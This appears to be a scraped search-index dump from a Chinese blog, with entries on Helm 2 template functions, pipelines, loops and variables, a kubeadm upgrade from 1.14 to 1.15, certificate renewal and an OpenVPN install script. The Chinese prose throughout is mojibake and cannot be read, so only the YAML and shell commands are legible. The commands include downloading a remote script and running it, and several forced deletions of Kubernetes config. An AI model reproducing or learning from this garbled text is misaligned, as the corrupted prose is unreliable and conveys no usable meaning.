è¦ç”¨åˆ°çš„å€¼ favorite: drink: coffee food: pizza pizzaToppings: - mushrooms - cheese - peppers - onions templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- end }} toppings: |- {{- range .Values.pizzaToppings }} - {{ . | title | quote }} {{- end }} è¯¥rangeå‡½æ•°å°†éå†pizzaToppingsåˆ—è¡¨ã€‚æ¯æ¬¡é€šè¿‡å¾ªç¯ï¼Œ.çš„å€¼éƒ½ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå³ ç¬¬ä¸€æ¬¡.ä¸ºmushroomsã€‚å°†ç¬¬äºŒä¸ªè¿­ä»£ä¸ºcheeseï¼Œä¾æ­¤ç±»æ¨ã€‚ æˆ‘ä»¬å¯ä»¥.ç›´æ¥æ²¿ç®¡é“å‘é€å€¼ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¿™æ ·åšæ—¶{{ . | title | quote }}ï¼Œå®ƒå…ˆå‘é€.åˆ°titleï¼ˆæ ‡é¢˜å¤§å°å†™å‡½æ•°ï¼‰ï¼Œç„¶åå‘é€åˆ°quoteã€‚å¦‚æœè¿è¡Œæ­¤æ¨¡æ¿ï¼Œåˆ™è¾“å‡ºä¸ºï¼š # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: edgy-dragonfly-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" toppings: |- - \"Mushrooms\" - \"Cheese\" - \"Peppers\" - \"Onions\" ","date":"2020-06-18 18:21","objectID":"/post/1806/:4:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"4.å˜é‡ ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"å®šä¹‰å’Œè°ƒç”¨ä¸€ä¸ªå˜é‡ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- $relname := .Release.Name -}} {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} release: {{ $relname }} {{- end }} ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:1","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"rangeéå†å¯¹è±¡ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} æ¸²æŸ“åçš„ç»“æœ # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: right-gibbon-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:2","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"rangeä½¿ç”¨å˜é‡æ¥æ¥æ”¶éå†å‡ºæ¥çš„å€¼å’Œç´¢å¼•ï¼Œä¾‹å¦‚ï¼š apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $index, $topping := .Values.pizzaToppings }} - {{ $index | toString | quote }}: {{ $topping | title | quote }} {{- end }} æ¸²æŸ“åï¼š apiVersion: v1 kind: ConfigMap metadata: name: sanguine-hydra-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- - \"0\": \"Mushrooms\" - \"1\": \"Cheese\" - \"2\": \"Peppers\" - \"3\": \"Onions\" ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:3","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"##æ¨¡æ¿å‡½æ•° 1.å°†.Valueså¯¹è±¡ä¸­çš„å­—ç¬¦ä¸²æ³¨å…¥æ¨¡æ¿æ—¶ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨quoteå‡½æ•°æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼š apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ quote .Values.favorite.drink }} food: {{ quote .Values.favorite.food }} æ¨¡æ¿å‡½æ•°éµå¾ªä»¥ä¸‹è¯­æ³•functionName arg1 arg2â€¦ã€‚åœ¨ä¸Šé¢çš„ä»£ç æ®µä¸­ï¼Œquote .Values.favorite.drinkè°ƒç”¨quoteå‡½æ•°å¹¶å°†å…¶ä¼ é€’ç»™å•ä¸ªå‚æ•°ã€‚ 2.æŸ¥çœ‹æ¸²æŸ“åçš„ç»“æœ # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: singed-puffin-configmap data: myvalue: \"Hello World\" drink: \"hello\" food: \"world\" å¯ä»¥çœ‹åˆ°drinkå’Œfoodéƒ½è¢«åŠ ä¸Šäº†å¼•å· æ¨¡æ¿å‡½æ•°æ‹¥æœ‰60å¤šç§å¯ç”¨å‡½æ•°ã€‚å…¶ä¸­ä¸€äº›æ˜¯ç”±Goæ¨¡æ¿è¯­è¨€æœ¬èº«å®šä¹‰çš„ã€‚å…¶ä»–å¤§å¤šæ•°éƒ½æ˜¯Sprigæ¨¡æ¿åº“çš„ä¸€éƒ¨åˆ†ã€‚æˆ‘ä»¬å°†é€šè¿‡ç¤ºä¾‹é€æ­¥ä»‹ç»å…¶ä¸­çš„è®¸å¤šå†…å®¹ã€‚ ##ç®¡é“ ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æ¨¡æ¿åŠŸèƒ½å’Œç®¡é“(äºŒ)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"æ¨¡æ¿è¯­è¨€çš„å¼ºå¤§åŠŸèƒ½ä¹‹ä¸€æ˜¯å…¶ç®¡é“æ¦‚å¿µã€‚ç®¡é“åˆ©ç”¨UNIXçš„æ¦‚å¿µï¼Œæ˜¯å°†ä¸€ç³»åˆ—æ¨¡æ¿å‘½ä»¤é“¾æ¥åœ¨ä¸€èµ·ä»¥ç´§å‡‘è¡¨è¾¾ä¸€ç³»åˆ—è½¬æ¢çš„å·¥å…·ã€‚æ¢å¥è¯è¯´ï¼Œç®¡é“æ˜¯æŒ‰é¡ºåºå®Œæˆå¤šé¡¹å·¥ä½œçš„æœ‰æ•ˆæ–¹å¼ã€‚ ###upperå‡½æ•°ï¼š æˆ‘ä»¬æ·»åŠ äº†upperå‡½æ•°ï¼Œå°†foodçš„å€¼è½¬æ¢æˆå¤§å†™ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | quote }} food: {{ .Values.favorite.food | upper | quote }} æ¸²æŸ“åçš„æ•ˆæœï¼š # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: exegetical-wildebeest-configmap data: myvalue: \"Hello World\" drink: \"hello\" food: \"WORLD\" ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:1","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æ¨¡æ¿åŠŸèƒ½å’Œç®¡é“(äºŒ)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"repeatå‡½æ•°: ä¸‹é¢çš„ä¾‹å­å°†æˆ‘ä»¬è·å–åˆ°çš„å€¼ï¼Œä½¿ç”¨repeatå‡½æ•°é‡å¤5æ¬¡ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | repeat 5 | quote }} food: {{ .Values.favorite.food | upper | quote }} æ¸²æŸ“åçš„æ•ˆæœï¼š # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: quelling-sparrow-configmap data: myvalue: \"Hello World\" drink: \"hellohellohellohellohello\" food: \"WORLD\" ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:2","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æ¨¡æ¿åŠŸèƒ½å’Œç®¡é“(äºŒ)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"defaultå‡½æ•° defaultå¯ä»¥è®¾ç½®ä¸€ä¸ªé»˜è®¤å€¼ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | repeat 5 | quote }} food: {{ .Values.favorite.food | default \"my is default\" | upper | quote }} æ‰‹åŠ¨å°†favorite.foodçš„å€¼è®¾ç½®ä¸ºç©ºï¼š helm install --dry-run --debug --set=favorite.food=null . æ¸²æŸ“åçš„æ•ˆæœ # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: ungaged-grizzly-configmap data: myvalue: \"Hello World\" drink: \"hellohellohellohellohello\" food: \"MY IS DEFAULT\" åœ¨å®é™…chartä¸­ï¼Œæ‰€æœ‰é™æ€é»˜è®¤å€¼éƒ½åº”ä½äºvalues.yamlä¸­ï¼Œå¹¶ä¸”ä¸åº”ä½¿ç”¨defaultå‘½ä»¤é‡å¤ï¼ˆå¦åˆ™å®ƒä»¬å°†æ˜¯å¤šä½™çš„ï¼‰ ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:3","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æ¨¡æ¿åŠŸèƒ½å’Œç®¡é“(äºŒ)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"chartåŒ…ç›®å½•ç»“æ„ï¼š demo1/ â”œâ”€â”€ charts #å­chartåŒ…ç›®å½• â”œâ”€â”€ Chart.yaml #chartåŒ…çš„æè¿°ä¿¡æ¯å…ƒæ•°æ® â”œâ”€â”€ templates # èµ„æºæ¸…å•æ¨¡æ¿ç›®å½• â”‚Â â”œâ”€â”€ deployment.yaml #èµ„æºæ¸…å•æ¨¡æ¿ â”‚Â â”œâ”€â”€ _helpers.tpl #å­˜æ”¾å¯åœ¨æ•´ä¸ªchartä¸­é‡å¤ä½¿ç”¨çš„å˜é‡ â”‚Â â”œâ”€â”€ ingress.yaml #èµ„æºæ¸…å•æ¨¡æ¿ â”‚Â â”œâ”€â”€ NOTES.txt #è¯´æ˜æ–‡ä»¶ï¼Œinstallåä¼šæ‰“å°åœ¨å±å¹•ä¸­ â”‚Â â””â”€â”€ service.yaml #èµ„æºæ¸…å•æ¨¡æ¿ â””â”€â”€ values.yaml #chartåŒ…çš„é»˜è®¤é…ç½®ä¿¡æ¯ Chart.yaml apiVersion: apiç‰ˆæœ¬ï¼Œå§‹ç»ˆæ˜¯v1 (å¿…é¡») name: chartåç§°(å¿…é¡») version: chartç‰ˆæœ¬å· (å¿…é¡») kubeVersion: å…¼å®¹çš„kubernetesç‰ˆæœ¬ (å¯é€‰) description: æè¿°ä¿¡æ¯ (å¯é€‰) keywords: - å…³é”®å­—åˆ—è¡¨ (å¯é€‰) home: é¡¹ç›®url (å¯é€‰) sources: - é¡¹ç›®æºç urlåˆ—è¡¨ (å¯é€‰) maintainers: # ç»´æŠ¤äººå‘˜çš„ä¿¡æ¯(å¯é€‰) - name: åå­— email: é‚®ç®± url: ç»´æŠ¤äººå‘˜çš„url engine: gotpl # æ¨¡æ¿å¼•æ“çš„åç§° (å¯é€‰, é»˜è®¤æ˜¯gotpl) icon: è¦ç”¨ä½œå›¾æ ‡çš„SVGæˆ–PNGå›¾åƒçš„URL (å¯é€‰) appVersion: chartåŒ…å«çš„åº”ç”¨ç¨‹åºç‰ˆæœ¬(å¯é€‰) deprecated: è¿™ä¸ªchartæ˜¯å¦è¢«åºŸå¼ƒ (å¯é€‰, å¸ƒå°”å‹) tillerVersion: éœ€è¦çš„tillerç‰ˆæœ¬(å¯é€‰) ","date":"2020-06-18 12:53","objectID":"/post/1803/:1:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"ç¬¬ä¸€ä¸ªæ¨¡æ¿ï¼š ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"1.åˆ›å»ºchartï¼š helm create mychart rm -fr mychart/templates/* ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:1","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"2.åˆ›å»ºèµ„æºæ¸…å•æ¨¡æ¿ï¼š vim mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:2","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"3.å®‰è£… å®‰è£… helm install . --name my-cm #æŸ¥çœ‹æ¸²æŸ“åçš„æ¨¡æ¿ helm get manifest my-cm ä¸Šé¢çš„{{ .Release.Name }}æ„æ€æ˜¯è·å–Releaseå¯¹è±¡çš„Nameå€¼ ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:3","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"helmæ¨¡æ¿æä¾›çš„å†…ç½®å¯¹è±¡ï¼š Releaseï¼š Release.Name: releaseçš„åç§° Release.Time: releaseçš„å‘å¸ƒæ—¶é—´ Release.Namespace: releaseçš„namespace Release.Service: å‘å¸ƒæœåŠ¡çš„åç§°ï¼Œæ€»æ˜¯Tiller Release.Revision: releaseçš„ç‰ˆæœ¬ä¿®è®¢å·ã€‚å®ƒä»1å¼€å§‹ï¼Œéšç€releaseçš„å‡çº§è€Œå¢åŠ ã€‚ Release.IsUpgrade: å¦‚æœå½“å‰æ“ä½œæ˜¯å‡çº§æˆ–å›æ»šï¼Œåˆ™ä¸ºtrue Release.IsInstall: å¦‚æœå½“å‰æ“ä½œæ˜¯å®‰è£…ï¼Œåˆ™ä¸ºtrue Valuesï¼šä»values.yamlæ–‡ä»¶å’Œç”¨æˆ·æä¾›çš„æ–‡ä»¶ä¼ é€’åˆ°æ¨¡æ¿çš„å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹Valuesä¸ºç©ºã€‚ Chartï¼šè¯»å–Chart.yamlæ–‡ä»¶çš„å†…å®¹ã€‚ä¾‹å¦‚{{.Chart.Name}}-{{.Chart.Version}}å°†æ‰“å°å‡ºmychart-0.1.0ã€‚ Filesï¼šè¿™æä¾›å¯¹å›¾è¡¨ä¸­æ‰€æœ‰éç‰¹æ®Šæ–‡ä»¶çš„è®¿é—®ã€‚è™½ç„¶æ— æ³•ä½¿ç”¨å®ƒæ¥è®¿é—®æ¨¡æ¿ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨å®ƒæ¥è®¿é—®å›¾è¡¨ä¸­çš„å…¶ä»–æ–‡ä»¶ã€‚ Files.Get æ˜¯ä¸€ä¸ªæŒ‰åç§°è·å–æ–‡ä»¶çš„å‡½æ•°ï¼ˆ.Files.Get config.iniï¼‰ Files.GetBytes æ˜¯å°†æ–‡ä»¶å†…å®¹ä½œä¸ºå­—èŠ‚æ•°ç»„è€Œä¸æ˜¯å­—ç¬¦ä¸²è·å–çš„å‡½æ•°ã€‚è¿™å¯¹äºåƒå›¾ç‰‡è¿™æ ·çš„ä¸œè¥¿å¾ˆæœ‰ç”¨ã€‚ Capabilities: æä¾›äº†å…³äº Kubernetes é›†ç¾¤æ”¯æŒçš„åŠŸèƒ½çš„ä¿¡æ¯ Capabilities.APIVersionsï¼šæ˜¯ä¸€ç»„ç‰ˆæœ¬ä¿¡æ¯ã€‚ Capabilities.APIVersions.Has $versionï¼šæ˜¯å¦æ”¯æŒæŒ‡å®šçš„apiæˆ–resourcesç‰ˆæœ¬ Capabilities.KubeVersionï¼šæä¾›æŸ¥æ‰¾Kubernetesç‰ˆæœ¬çš„æ–¹æ³•ã€‚å®ƒæœ‰ä»¥ä¸‹å€¼:Majorã€Minorã€GitVersionã€GitCommitã€GitTreeStateã€BuildDateã€GoVersionã€Compilerå’ŒPlatformã€‚ Capabilities.TillerVersionï¼šæä¾›äº†ä¸€ç§æŸ¥æ‰¾tillerç‰ˆæœ¬çš„æ–¹æ³•ã€‚å®ƒæœ‰ä»¥ä¸‹å€¼:SemVer, GitCommit, GitTreeStateã€‚ Template: Contains information about the current template that is being executed Name:å½“å‰æ¨¡æ¿çš„æ–‡ä»¶è·¯å¾„(ä¾‹å¦‚mychart/templates/mytemplate.yaml) BasePath: å½“å‰chartæ¨¡æ¿ç›®å½•è·¯å¾„(ä¾‹å¦‚mychart/templates) è¿™äº›å€¼å¯ç”¨äºä»»ä½•é¡¶çº§æ¨¡æ¿ã€‚è¿™å¹¶ä¸ä¸€å®šæ„å‘³ç€å®ƒä»¬å°†åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ç”¨ã€‚ ","date":"2020-06-18 12:53","objectID":"/post/1803/:3:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"values æ–‡ä»¶ ä¼ é€’åˆ°chartä¸­çš„å€¼ã€‚å®ƒçš„å†…å®¹æ¥è‡ªå››ä¸ªæ¥æº: chartåŒ…çš„values.yamlæ–‡ä»¶ å¦‚æœæ˜¯å­chartï¼Œåˆ™values.yamlæ–‡ä»¶ä¸ºçˆ¶chartåŒ…çš„ é€šè¿‡-få‚æ•°æŒ‡å®šä¸€ä¸ªæ–‡ä»¶(helm install -f myvals.yaml ./mychart) é€šè¿‡â€“setæŒ‡å®š (helm install â€“set foo=bar ./mychart) ä¸Šé¢çš„åˆ—è¡¨æŒ‰ç‰¹å®šæ€§é¡ºåºæ’åˆ—ï¼švalues.yamlæ˜¯é»˜è®¤å€¼ï¼Œå¯ä»¥è¢«çˆ¶å›¾è¡¨çš„è¦†ç›–values.yamlï¼Œè€Œåè€…å¯ä»¥ç”±ç”¨æˆ·æä¾›çš„å€¼æ–‡ä»¶è¦†ç›–ï¼Œè€Œåè€…åˆå¯ä»¥ç”±â€“setå‚æ•°è¦†ç›–ã€‚ ç¤ºä¾‹ï¼š 1.æ·»åŠ ä¸€ä¸ªvalue echo 'name: soulchild' \u003e values.yaml 2.ä¿®æ”¹æ¨¡æ¿cat templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" namespace: {{ .Release.Namespace }} name: {{ .Values.name }} 3.å‡çº§chart helm upgrade my-cm . 4.æŸ¥çœ‹æ¸²æŸ“åçš„ç»“æœ helm get manifest my-cm --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: wishing-rottweiler-configmap data: myvalue: \"Hello World\" namespace: default name: soulchild ","date":"2020-06-18 12:53","objectID":"/post/1803/:4:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘å…¥é—¨(ä¸€)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"å®‰è£… ä¸‹è½½å®¢æˆ·ç«¯ï¼š wget https://get.helm.sh/helm-v2.10.0-linux-amd64.tar.gz å®‰è£…å®¢æˆ·ç«¯: tar xf helm-v2.10.0-linux-amd64.tar.gz mv linux-amd64/helm /usr/local/sbin/ å®‰è£…tiller: helm init --tiller-image=registry.cn-shanghai.aliyuncs.com/soulchild/tiller:v2.10.0 é€šè¿‡helm versionæŸ¥çœ‹å®‰è£…ç»“æœ é…ç½®rbacï¼š apiVersion: v1 kind: ServiceAccount metadata: name: tiller namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRoleBinding metadata: name: tiller roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - name: tiller kind: ServiceAccount namespace: kube-system æŒ‡å®špodçš„serviceaccount,ä¹Ÿå¯ä»¥åœ¨åˆå§‹åŒ–çš„æ—¶å€™åŠ ä¸Šâ€“service-accountå‚æ•° kubectl patch deployments. -n kube-system tiller-deploy -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccount\":\"tiller\"}}}}' ","date":"2020-06-17 16:49","objectID":"/post/1801/:1:0","tags":["k8s","helm"],"title":"helm2å®‰è£…ä½¿ç”¨","uri":"/post/1801/"},{"categories":["kubernetes"],"content":"å¸¸ç”¨å‘½ä»¤ï¼š #åˆ›å»ºä¸€ä¸ªchart helm create demo1 #æ£€æŸ¥chartæ˜¯å¦æ­£å¸¸ helm lint demo1/ #å°†chartæ‰“åŒ… helm package demo1/ #å®‰è£…ä¸€ä¸ªchart helm install demo1/ #æŸ¥çœ‹release helm ls #æŸ¥çœ‹å†å²release helm ls -a #åˆ é™¤release helm delete dusty-condor #åˆ é™¤å†å²release helm delete dusty-condor --purge #æ·»åŠ ä»“åº“ helm repo add aliyun https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts #æŸ¥çœ‹ä»“åº“åˆ—è¡¨ helm repo list #æ›´æ–°ä»“åº“ helm repo update #æŸ¥æ‰¾chartåŒ… helm search mysql #æŸ¥çœ‹chartåŒ…è¯¦ç»†ä¿¡æ¯ helm inspect aliyun/mariadb ","date":"2020-06-17 16:49","objectID":"/post/1801/:2:0","tags":["k8s","helm"],"title":"helm2å®‰è£…ä½¿ç”¨","uri":"/post/1801/"},{"categories":["kubernetes"],"content":"masterèŠ‚ç‚¹ï¼š 1.å‡çº§kubeadm yum install -y kubeadm-1.15.12-0 --disableexcludes=kubernetes æŸ¥çœ‹ç‰ˆæœ¬kubeadm version 2.æ£€æŸ¥å¯å‡çº§çš„ç‰ˆæœ¬ kubeadm upgrade plan 3.å‡çº§kubeadmé…ç½® kubeadm upgrade apply v1.15.12 æœ€åå¯ä»¥çœ‹åˆ°æç¤ºï¼š [upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.15.12\". Enjoy! 4.å‡çº§kubeletå’Œkubectl yum install -y kubelet-1.15.12-0 kubectl-1.15.12-0 --disableexcludes=kubernetes 5.å‡çº§CNIæ’ä»¶ å®¹å™¨ç½‘ç»œæ¥å£ï¼ˆCNIï¼‰æä¾›ç¨‹åºå¯èƒ½æœ‰å…¶è‡ªå·±çš„å‡çº§è¯´æ˜ã€‚æ£€æŸ¥æ’ä»¶é¡µé¢ä»¥æ‰¾åˆ°æ‚¨çš„CNIæä¾›ç¨‹åºï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦éœ€è¦å…¶ä»–å‡çº§æ­¥éª¤ã€‚https://v1-15.docs.kubernetes.io/docs/concepts/cluster-administration/addons/ å¦‚æœCNIç¨‹åºæ˜¯DaemonSetè¿è¡Œï¼Œåˆ™åœ¨å…¶ä»–èŠ‚ç‚¹ä¸Šä¸éœ€è¦æ‰§è¡Œæ­¤æ­¥éª¤ 6.å‡çº§å…¶ä»–masterèŠ‚ç‚¹ kubeadm upgrade node yum install -y kubelet-1.15.12-0 kubectl-1.15.12-0 --disableexcludes=kubernetes 7.é‡å¯masterèŠ‚ç‚¹kubelet systemctl restart kubelet ","date":"2020-06-16 16:40","objectID":"/post/1795/:1:0","tags":["k8s"],"title":"k8s 1.14.2 å‡çº§é›†ç¾¤è‡³1.15.12","uri":"/post/1795/"},{"categories":["kubernetes"],"content":"nodeèŠ‚ç‚¹ï¼š å‡çº§kubeadm yum install -y kubeadm-1.15.12-0 --disableexcludes=kubernetes é©±é€èŠ‚ç‚¹ kubectl drain \u003cNodeName\u003e --ignore-daemonsets nodeèŠ‚ç‚¹æ‰§è¡Œå‡çº§kubeadmã€kubeletï¼š kubeadm upgrade node yum install -y kubelet-1.15.12-0 kubectl-1.15.x-0 --disableexcludes=kubernetes é‡å¯kubeletï¼š systemctl restart kubelet æ¢å¤nodeèŠ‚ç‚¹è°ƒåº¦ï¼š kubectl uncordon \u003cNodeName\u003e æŸ¥çœ‹å‡çº§åçš„èŠ‚ç‚¹ç‰ˆæœ¬ä¿¡æ¯ï¼š kubectl get nodes å®˜æ–¹æ–‡æ¡£ï¼š https://v1-15.docs.kubernetes.io/docs/tasks/administer-cluster/kubeadm/kubeadm-upgrade-1-15/ ","date":"2020-06-16 16:40","objectID":"/post/1795/:2:0","tags":["k8s"],"title":"k8s 1.14.2 å‡çº§é›†ç¾¤è‡³1.15.12","uri":"/post/1795/"},{"categories":["kubernetes"],"content":"å‚è€ƒï¼šhttps://www.ancii.com/ahevxud6j/ è¯ä¹¦åˆ°æœŸåä¼šæç¤º:Unable to connect to the server: x509: certificate has expired or is not yet valid æŸ¥çœ‹è¯ä¹¦è¿‡æœŸæ—¶é—´ï¼š # æ–¹æ³•1 kubeadm alpha certs check-expiration # æ–¹æ³•2 openssl x509 -noout -dates -in /etc/kubernetes/pki/apiserver.crt å„ä¸ªè¯ä¹¦çš„è¿‡æœŸæ—¶é—´ /etc/kubernetes/pki/apiserver.crt #1å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/front-proxy-ca.crt #10å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/ca.crt #10å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/apiserver-etcd-client.crt #1å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/front-proxy-client.crt #1å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/etcd/server.crt #1å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/etcd/ca.crt #10å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/etcd/peer.crt #1å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/etcd/healthcheck-client.crt #1å¹´æœ‰æ•ˆæœŸ /etc/kubernetes/pki/apiserver-kubelet-client.crt #1å¹´æœ‰æ•ˆæœŸ 1.å¤‡ä»½é…ç½®æ–‡ä»¶å’Œetcd cp -rp /etc/kubernetes /etc/kubernetes.bak cp -r /var/lib/etcd /var/lib/etcd.bak 2.ç”Ÿæˆé›†ç¾¤é…ç½®æ–‡ä»¶ kubeadm config view \u003e ./cluster.yaml 3.è¯ä¹¦ç»­æœŸ kubeadm alpha certs renew all --config=./cluster.yaml 4.é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶ rm -f /etc/kubernetes/*.conf kubeadm init phase kubeconfig all --config=./cluster.yaml 5.é‡å¯kubeletã€apiserverã€controller-managerã€schedulerã€etcd docker ps |grep -E 'k8s_kube-apiserver|k8s_kube-controller-manager|k8s_kube-scheduler|k8s_etcd_etcd' | awk -F ' ' '{print $1}' |xargs docker restart 6.æŸ¥çœ‹è¯ä¹¦è¿‡æœŸæ—¶é—´ for item in `find /etc/kubernetes/pki -maxdepth 2 -name \"*.crt\"`;do openssl x509 -in $item -text -noout| grep Not;echo ======================$item===============;done 7.å¤åˆ¶æ–°çš„è®¤è¯æ–‡ä»¶ rm -fr ~/.kube/ cp /etc/kubernetes/admin.conf ~/.kube/config ","date":"2020-06-16 11:52","objectID":"/post/1558/:0:0","tags":["k8s"],"title":"k8s 1.14.2 ä½¿ç”¨kubeadmç»™è¯ä¹¦ç»­æœŸ","uri":"/post/1558/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"è„šæœ¬githubåœ°å€ï¼šhttps://github.com/Nyr/openvpn-install ä¸‹è½½è„šæœ¬ï¼š wget https://raw.githubusercontent.com/Nyr/openvpn-install/master/openvpn-install.sh å®‰è£…ï¼š sh openvpn-install.sh æ²¡æœ‰ç‰¹æ®Šéœ€æ±‚é»˜è®¤å³å¯ 56995-n3gc40qsaf.png soulç”¨æˆ·çš„å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶è·¯å¾„ï¼š/root/soul.ovpn å°†æ­¤æ–‡ä»¶å¯¼å…¥åˆ°openvpnä¸­ï¼Œè¿æ¥å³å¯ã€‚ ","date":"2020-06-15 